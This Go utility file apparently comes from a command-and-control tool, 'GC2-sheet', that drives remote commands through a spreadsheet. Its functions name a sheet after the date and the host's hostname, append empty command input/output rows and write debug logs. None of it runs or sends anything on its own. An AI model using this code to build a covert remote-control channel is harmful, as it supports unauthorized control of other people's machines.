package utils

import (
	"GC2-sheet/internal/configuration"
	"log"
	"os"
	"strconv"
	"time"
)

func GenerateNewSheetName() string {

	currentTime := time.Now()

	currentTimeS := currentTime.Format("02-01-2006")

	unixString := strconv.FormatInt(currentTime.Unix(), 10)

	hostname, err := os.Hostname()
	if err != nil {
		return currentTimeS + "-" + unixString[len(unixString)-5:]
	}

	return currentTimeS + "-" + hostname + "-" + unixString[len(unixString)-5:]

}

func GetLastCommand(spreadSheet *configuration.SpreadSheet) *configuration.Commands {

	return &spreadSheet.CommandSheet.CommandsExecution[len(spreadSheet.CommandSheet.CommandsExecution)-1]

}

func CreateNewEmptyCommand(spreadSheet *configuration.SpreadSheet) {

	lastCommand := GetLastCommand(spreadSheet)

	// Creating new empty command
	command := configuration.Commands{
		RangeIn: "!A",
		RangeOut: "!B",
		RangeId: lastCommand.RangeId+1,
		Input:   "",
		Output:  "",
	}

	// Add command to pool
	spreadSheet.CommandSheet.CommandsExecution = append(spreadSheet.CommandSheet.CommandsExecution, command)

}

func LogDebug(message string) {

	if configuration.GetOptionsDebug(){
		log.Println(message)
	}

}

func LogFatalDebug(message string) {

	if configuration.GetOptionsDebug(){
		log.Fatal(message)
	}

}